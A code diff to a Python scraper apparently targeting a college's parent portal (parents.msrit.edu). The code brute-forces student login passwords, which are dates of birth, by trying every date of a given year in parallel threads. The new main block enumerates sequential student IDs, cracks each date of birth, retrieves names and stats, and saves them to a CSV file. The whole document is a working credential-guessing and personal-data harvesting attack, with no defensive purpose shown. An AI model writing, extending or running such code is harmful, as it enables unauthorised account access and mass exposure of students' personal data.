@@ -1,29 +1,10 @@
+import os
 import pickle
-from typing import Union
 import time
-from functools import wraps
-
-from scraper import Scraper
+from typing import Union
 from threading import Thread
 
-
-def cached(cache):
-    def cashee(func):
-        func.cache = cache
-
-        @wraps(func)
-        def wrapper(self, *args):
-            try:
-                r = func.cache[args]
-                print(f"[Log] Using Cache")
-                return r
-            except KeyError:
-                func.cache[args] = result = func(self, *args)
-                return result
-
-        return wrapper
-
-    return cashee
+from scraper import Scraper, cached
 
 
 class SisScraper(Scraper):
@@ -54,18 +35,20 @@ class SisScraper(Scraper):
         except FileNotFoundError:
             return {}
 
+    def save_cache(self):
+        with open('cache1er2344.bin', 'wb') as file:
+            pickle.dump(self.get_dob.cache, file)
+
     def __init__(self, URL="https://parents.msrit.edu/"):
         self.URL = URL
         super(SisScraper, self).__init__()
 
     def get_stats(self, payload) -> dict[str, str]:
-        self.start_session()
         soup = self.get_soap(self.URL, "POST", payload)
         body = soup.body
         if body.find(id="username"): return {}
         td = body.find_all("td")
         trs = body.find_all("tbody")[1].find_all("tr")
-        self.stop_session()
         return {
             "name": body.find_all("h3")[0].text,
             "usn": payload["username"],
@@ -90,44 +73,61 @@ class SisScraper(Scraper):
 
     def brute_year(self, usn: str, year: int) -> Union[str, None]:
         workers = []
-        dat = [None]
         t = time.time()
-        self.start_session()
+        dob = [None]
         for i in range(1, 13):
-            worker = Thread(target=self.brute_month, args=(usn, year, i, dat))
+            worker = Thread(target=self.brute_month, args=(usn, year, i, dob))
             workers.append(worker)
             worker.start()
         for worker in workers:
             worker.join()
-        self.stop_session()
         print("[Log] Time:", time.time() - t, "sec")
-        return dat.pop()
+        return dob.pop()
 
-    def brute_month(self, usn: str, year: int, month: int, dat: list) -> Union[str, None]:
+    def brute_month(self, usn: str, year: int, month: int, dob_thread: list = None) -> Union[str, None]:
         payload = self.gen_payload()
+        assert (dob_list := isinstance(dob_thread, list)) or dob_thread is None, \
+            "dob_thread must be a list, used for threading"
+        if dob_list:
+            assert len(dob_thread) == 1, \
+                "dob_thread must have a single element, used for default value"
         for i in range(1, 32):
-            if len(dat) > 1: return
+            if dob_list and len(dob_thread) > 1: return
             payload['username'] = usn.lower()
             payload['passwd'] = f"{year}-{month:02}-{i:02}"
             if self.get_post_body(payload):
-                dat.append(payload['passwd'])
+                if dob_list: dob_thread.append(payload['passwd'])
                 return payload['passwd']
 
-    def __enter__(self):
-        return self
-
     def __exit__(self, exc_type, exc_val, exc_tb):
-        with open('cache1er2344.bin', 'wb') as file:
-            pickle.dump(self.get_dob.cache, file)
+        self.save_cache()
+        super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)
 
 
 if __name__ == '__main__':
+    HEAD = "1MS"
     YEAR = "21"
     DEPT = "IS"
-    with SisScraper() as SIS:
-        for _i in [18, 17]:
-            _payload = SIS.gen_payload()
-            _payload['username'] = SIS.gen_usn(YEAR, DEPT, _i)
-            _payload['passwd'] = SIS.get_dob(_payload['username'])
-            _stats = SIS.get_stats(_payload)
-            print(_stats)
+    TOLERATE = 5
+    if not os.path.exists(f"sis"): os.mkdir(f"sis")
+    with SisScraper() as SIS, open(f"sis/sis_{YEAR}_{DEPT}.csv", "w+") as f:
+        tol = TOLERATE
+        _i = 1
+        f.write(_write := f"{'usn':{len(HEAD) + len(YEAR) + len(DEPT) + 3}},{'name':64},{'dob':10}\n")
+        print(_write)
+        while tol > 0:
+            pl = SIS.gen_payload()
+            pl['username'] = SIS.gen_usn(YEAR, DEPT, _i, HEAD)
+            pl['passwd'] = SIS.get_dob(pl['username'])
+            st = SIS.get_stats(pl)
+            _i += 1
+            if not st:
+                tol -= 1
+                continue
+            tol = TOLERATE
+            f.write(
+                _write := f"{pl['username']:{len(HEAD) + len(YEAR) + len(DEPT) + 3}},{st['name']:64},{pl['passwd']:10}\n"
+            )
+            SIS.save_cache()
+            f.flush()
+            print(_write)
